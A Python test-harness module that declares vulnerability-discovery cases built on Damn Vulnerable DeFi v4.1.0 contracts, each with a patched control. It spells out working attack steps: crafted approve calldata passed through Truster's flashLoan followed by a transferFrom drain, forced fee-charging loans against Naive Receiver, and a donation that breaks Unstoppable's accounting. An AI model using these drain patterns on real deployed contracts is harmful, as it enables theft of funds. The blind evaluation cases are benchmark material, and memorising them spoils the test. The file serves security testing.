"""External-source EVM cases: real, independently-maintained bytecode.

Mission 03 asks whether BLACKHEART can discover *and independently verify* a
vulnerability in unfamiliar, externally-maintained application code. The
historical-rediscovery corpus answers a narrower question -- it re-derives a
documented bug from a **Python model** of the logic. These cases are different:
they deploy the **actual Solidity bytecode** of a third-party, widely-used,
independently-maintained vulnerable-application suite (Damn Vulnerable DeFi
v4.1.0) to a real EVM and let the engine drive it.

What is external and what is ours (stated plainly, because it bounds the claim):

  * **External:** the deployed contracts -- ``src/...`` in the vendored DVDF tree
    at a pinned commit. The engine neither owns nor edits them. The engine is not
    told which challenge is vulnerable or where the bug is; it is given only a
    model (actors, operations, invariants) and a budget.
  * **Ours:** the *case declaration* -- which contracts to deploy, the setup calls
    that reach the documented initial state, the operations the engine may try,
    the invariants it must hold, and the read-only snapshot it inspects. This is
    the same "explicit, auditable adapter declaration" pattern the HTTP apps use.
  * **Ours (controls only):** the *patched* counterparts used as the verifier's
    differential control (``harnesses/dvdf-external/controls``). The vulnerable
    target is upstream bytecode; the control is our minimal fix, which is what
    makes a hit meaningful.

Honesty rules this module enforces:

  * Every case names the real upstream project, the pinned version, and the
    challenge it models. No invented addresses or versions.
  * The ground truth (the documented, publicly-known vulnerability) is recorded in
    ``ground_truth`` for the report but is **not** read by the engine: the search
    sees only the model, the operations and the invariants.
"""

from __future__ import annotations

from pathlib import Path

from .evm import (
    ContractSpec,
    EvmCase,
    EvmOp,
    Param,
    Ref,
    Self,
    SetupCall,
    SnapshotRead,
)

# --------------------------------------------------------------------------- #
# The vendored, pinned external project
# --------------------------------------------------------------------------- #

#: Damn Vulnerable DeFi v4.1.0 -> commit 64fddf9f96de2782f8868898d68673acb295119c.
#: The tree is fetched by ``harnesses/dvdf-external/fetch.sh`` and is git-ignored.
_HERE = Path(__file__).resolve()
DVDF_ROOT = _HERE.parents[3] / "harnesses" / "dvdf-external" / "vendor" / "dvdf"
CONTROL_ROOT = _HERE.parents[3] / "harnesses" / "dvdf-external" / "controls"

DVDF_COMMIT = "64fddf9f96de2782f8868898d68673acb295119c"
DVDF_TAG = "v4.1.0"

E18 = 10 ** 18

ATTACKER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"   # anvil account 0
DEPLOYER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"   # anvil account 1


def _art(rel: str) -> str:
    return str(DVDF_ROOT / "out" / rel)


def _ctrl(rel: str) -> str:
    return str(CONTROL_ROOT / "out" / rel)


# --------------------------------------------------------------------------- #
# Case 1 -- Unstoppable (development): a broken accounting invariant
# --------------------------------------------------------------------------- #

def unstoppable_case(*, control: bool = False) -> EvmCase:
    """The DVDF *Unstoppable* vault: `totalAssets()` trusts its live token balance.

    Documented flaw (public): the vault's ERC4626 accounting reads the *live*
    token balance, so a direct donation makes ``convertToShares(totalSupply) !=
    totalAssets()``; the vault's own flashLoan path then reverts on
    ``InvalidBalance``. Invariant the engine must break: ERC4626 accounting
    consistency (``totalAssets() == totalSupply()`` for this 1:1 vault).

    ``control=True`` deploys our patched vault (``StoredAssetsVault``) that tracks
    its assets in storage, so a donation cannot desynchronise it.
    """
    tokens_in_vault = 1_000_000 * E18

    def inv_accounting_consistent(s: dict) -> bool:
        if s.get("total_assets") is None or s.get("total_supply") is None:
            return True
        if s["total_supply"] == 0:
            return True
        return s["total_assets"] == s["total_supply"]

    vault_artifact = (_ctrl("StoredAssetsVault.sol/StoredAssetsVault.json") if control
                      else _art("UnstoppableVault.sol/UnstoppableVault.json"))

    return EvmCase(
        name="dvdf-unstoppable" + ("-control" if control else ""),
        suite="control" if control else "development",
        description="DVDF Unstoppable: ERC4626 vault trusts its live token balance",
        root=DVDF_ROOT if not control else CONTROL_ROOT,
        actors={"attacker": "0"},
        contracts=(
            ContractSpec("token", _art("DamnValuableToken.sol/DamnValuableToken.json")),
            ContractSpec("vault", vault_artifact,
                         ctor_types=("address", "address", "address"),
                         ctor_args=(Ref("token"), DEPLOYER, DEPLOYER)),
        ),
        setup=(
            SetupCall(actor="1", target="token", signature="approve(address,uint256)",
                      args=(Ref("vault"), tokens_in_vault)),
            SetupCall(actor="1", target="vault", signature="deposit(uint256,address)",
                      args=(tokens_in_vault, DEPLOYER)),
            SetupCall(actor="1", target="token", signature="transfer(address,uint256)",
                      args=(ATTACKER, 10_000 * E18)),
        ),
        ops=(
            EvmOp("deposit", "attacker", "vault", "deposit(uint256,address)",
                  args=(Param("amount"), Self()),
                  param_types={"amount": "uint256"}, domains={"amount": (10 * E18,)},
                  description="ERC4626 deposit of DVT into the vault"),
            EvmOp("transfer_in", "attacker", "token", "transfer(address,uint256)",
                  args=(Ref("vault"), Param("amount")),
                  param_types={"amount": "uint256"},
                  domains={"amount": (1, 10 * E18, 1000 * E18)},
                  description="directly transfer DVT to the vault (a donation)"),
        ),
        snapshot=(
            SnapshotRead("total_assets", "vault", "totalAssets()"),
            SnapshotRead("total_supply", "vault", "totalSupply()"),
        ),
        invariants=(
            ("INV-ACCOUNTING", "totalAssets() == totalSupply() (ERC4626 consistency)",
             inv_accounting_consistent),
        ),
        sensitive=("transfer_in",),
        ground_truth=(
            "A direct DVT transfer (donation) to the vault makes totalAssets() exceed "
            "convertToShares(totalSupply); the vault's flashLoan path then reverts on "
            "InvalidBalance and the monitor pauses the vault."
        ),
        reference="Damn Vulnerable DeFi v4.1.0 'Unstoppable' (damnvulnerabledefi.xyz)",
    )


# --------------------------------------------------------------------------- #
# Case 2 -- Truster (blind): an arbitrary-call flash loan
# --------------------------------------------------------------------------- #

def truster_case(*, control: bool = False) -> EvmCase:
    """The DVDF *Truster* pool: ``flashLoan`` calls an attacker-chosen target.

    Documented flaw (public): ``flashLoan`` performs ``target.functionCall(data)``
    with a caller-supplied target and data, so a borrower can make the pool call
    ``token.approve(attacker, max)`` and then pull the pool's whole balance with
    ``transferFrom``. Invariant: the pool's token balance never falls below the
    amount it is owed.

    ``control=True`` deploys our patched pool (``SafeCallbackPool``) that only
    calls back a typed borrower, so no arbitrary call is possible.
    """
    pool_balance = 1_000_000 * E18

    def inv_pool_funded(s: dict) -> bool:
        if s.get("pool_balance") is None:
            return True
        return s["pool_balance"] >= pool_balance

    approve_max = ("0x095ea7b3"
                   + "0" * 24 + ATTACKER[2:]
                   + "f" * 64)

    pool_artifact = (_ctrl("SafeCallbackPool.sol/SafeCallbackPool.json") if control
                     else _art("TrusterLenderPool.sol/TrusterLenderPool.json"))

    return EvmCase(
        name="dvdf-truster" + ("-control" if control else ""),
        suite="control" if control else "blind",
        description="DVDF Truster: flash loan performs a caller-chosen arbitrary call",
        root=DVDF_ROOT if not control else CONTROL_ROOT,
        actors={"attacker": "0"},
        contracts=(
            ContractSpec("token", _art("DamnValuableToken.sol/DamnValuableToken.json")),
            ContractSpec("pool", pool_artifact,
                         ctor_types=("address",), ctor_args=(Ref("token"),)),
        ),
        setup=(
            SetupCall(actor="1", target="token", signature="transfer(address,uint256)",
                      args=(Ref("pool"), pool_balance)),
        ),
        ops=(
            EvmOp("flash_loan", "attacker", "pool", "flashLoan(uint256,address,address,bytes)",
                  args=(Param("amount"), Self(), Ref("token"), approve_max),
                  param_types={"amount": "uint256"}, domains={"amount": (0,)},
                  description="flash loan that forwards an attacker-chosen target+data"),
            EvmOp("pull_funds", "attacker", "token", "transferFrom(address,address,uint256)",
                  args=(Ref("pool"), Self(), Param("amount")),
                  param_types={"amount": "uint256"}, domains={"amount": (pool_balance,)},
                  description="pull the pool's tokens using an allowance the pool granted"),
        ),
        snapshot=(
            SnapshotRead("pool_balance", "token", "balanceOf(address)", args=(Ref("pool"),)),
            SnapshotRead("attacker_balance", "token", "balanceOf(address)", args=(ATTACKER,)),
        ),
        invariants=(
            ("INV-POOL-FUNDED", "the pool keeps the balance it is owed",
             inv_pool_funded),
        ),
        sensitive=("flash_loan", "pull_funds"),
        ground_truth=(
            "flashLoan forwards an arbitrary target+data, so the attacker makes the pool "
            "call token.approve(attacker, max) and then pulls the whole balance with "
            "transferFrom."
        ),
        reference="Damn Vulnerable DeFi v4.1.0 'Truster' (damnvulnerabledefi.xyz)",
    )


# --------------------------------------------------------------------------- #
# Case 3 -- Naive Receiver (blind): force the victim receiver to pay fees
# --------------------------------------------------------------------------- #

def naive_receiver_case(*, control: bool = False) -> EvmCase:
    """The DVDF *Naive Receiver* pool: anyone can force the receiver to take loans.

    Documented flaw (public): the pool's flash loan is callable by anyone *on
    behalf of* any receiver, and each call costs the receiver a fixed 1 WETH fee,
    so an attacker drains the victim receiver by repeatedly triggering loans.
    Invariant: the victim receiver's WETH balance never decreases.

    ``control=True`` deploys our patched pool (``SenderBoundPool``) that requires
    the receiver to be the caller.
    """
    weth_in_receiver = 10 * E18

    def inv_receiver_untouched(s: dict) -> bool:
        if s.get("receiver_balance") is None:
            return True
        return s["receiver_balance"] >= weth_in_receiver

    pool_artifact = (_ctrl("SenderBoundPool.sol/SenderBoundPool.json") if control
                     else _art("NaiveReceiverPool.sol/NaiveReceiverPool.json"))

    if control:
        pool_spec = ContractSpec("pool", pool_artifact,
                                 ctor_types=("address", "address"),
                                 ctor_args=(Ref("weth"), DEPLOYER), value=1000 * E18)
        contracts = (
            ContractSpec("weth", _art("WETH.sol/WETH.json")),
            pool_spec,
            ContractSpec("receiver", _art("FlashLoanReceiver.sol/FlashLoanReceiver.json"),
                         ctor_types=("address",), ctor_args=(Ref("pool"),)),
        )
    else:
        # the real pool integrates a permissionless meta-transaction forwarder
        pool_spec = ContractSpec("pool", pool_artifact,
                                 ctor_types=("address", "address", "address"),
                                 ctor_args=(Ref("forwarder"), Ref("weth"), DEPLOYER),
                                 value=1000 * E18)
        contracts = (
            ContractSpec("weth", _art("WETH.sol/WETH.json")),
            ContractSpec("forwarder", _art("BasicForwarder.sol/BasicForwarder.json")),
            pool_spec,
            ContractSpec("receiver", _art("FlashLoanReceiver.sol/FlashLoanReceiver.json"),
                         ctor_types=("address",), ctor_args=(Ref("pool"),)),
        )

    return EvmCase(
        name="dvdf-naive-receiver" + ("-control" if control else ""),
        suite="control" if control else "blind",
        description="DVDF Naive Receiver: anyone can force the victim receiver to pay fees",
        root=DVDF_ROOT if not control else CONTROL_ROOT,
        actors={"attacker": "0"},
        contracts=contracts,
        setup=(
            SetupCall(actor="1", target="weth", signature="deposit()", value=weth_in_receiver),
            SetupCall(actor="1", target="weth", signature="transfer(address,uint256)",
                      args=(Ref("receiver"), weth_in_receiver)),
        ),
        ops=(
            EvmOp("flash_loan_victim", "attacker", "pool",
                  "flashLoan(address,address,uint256,bytes)",
                  args=(Ref("receiver"), Ref("weth"), Param("amount"), "0x"),
                  param_types={"amount": "uint256"}, domains={"amount": (0,)},
                  description="trigger a flash loan the victim receiver must repay a fee for"),
        ),
        snapshot=(
            SnapshotRead("receiver_balance", "weth", "balanceOf(address)", args=(Ref("receiver"),)),
            SnapshotRead("pool_balance", "weth", "balanceOf(address)", args=(Ref("pool"),)),
        ),
        invariants=(
            ("INV-RECEIVER", "the victim receiver's WETH balance never decreases",
             inv_receiver_untouched),
        ),
        sensitive=("flash_loan_victim",),
        ground_truth=(
            "flashLoan is callable with any receiver, so the attacker repeatedly triggers "
            "loans the victim must repay 1 WETH for; the victim's balance drains."
        ),
        reference="Damn Vulnerable DeFi v4.1.0 'Naive Receiver' (damnvulnerabledefi.xyz)",
    )


# --------------------------------------------------------------------------- #
# The case registry
# --------------------------------------------------------------------------- #

#: Development cases: used to build and tune the adapter (the adapter author knows
#: the bug). Kept small and clearly labelled.
DEVELOPMENT_CASES = {
    "dvdf-unstoppable": unstoppable_case,
}

#: Blind cases: the discovery run the mission is judged on. Each is a documented
#: real bug in external source; the engine is not told where it is.
BLIND_CASES = {
    "dvdf-truster": truster_case,
    "dvdf-naive-receiver": naive_receiver_case,
}

#: Differential controls: the same challenge with our minimal fix, used only by the
#: verifier's control factory.
CONTROL_CASES = {
    "dvdf-unstoppable": lambda: unstoppable_case(control=True),
    "dvdf-truster": lambda: truster_case(control=True),
    "dvdf-naive-receiver": lambda: naive_receiver_case(control=True),
}

ALL_CASES = {**DEVELOPMENT_CASES, **BLIND_CASES}


def get_case(name: str, *, control: bool = False) -> EvmCase:
    if control:
        if name not in CONTROL_CASES:
            raise KeyError(f"no control for {name!r}")
        return CONTROL_CASES[name]()
    if name not in ALL_CASES:
        raise KeyError(f"unknown external case {name!r}; known: {sorted(ALL_CASES)}")
    return ALL_CASES[name]()
